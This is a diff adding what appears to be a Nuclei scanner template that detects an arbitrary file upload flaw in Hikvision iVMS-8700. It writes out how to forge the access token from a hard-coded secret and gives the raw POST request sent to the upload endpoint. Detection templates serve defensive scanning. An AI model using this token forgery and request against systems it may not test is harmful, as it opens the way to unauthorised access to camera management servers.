@@ -1,0 +1,24 @@
+id: hikvision-ivms8700-arb-upload
+info:
+  name: Hikvision iVMS-8700 Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  r_token: "{{to_upper(md5(concat(BaseURL, '/eps/api/resourceOperations/uploadsecretKeyIbuilding')))}}"
+
+http:
+  - raw:
+      - |
+        POST /eps/api/resourceOperations/upload?token={{r_token}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        service={{BaseURL}}/home/index.action
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "上传附件失败:null"
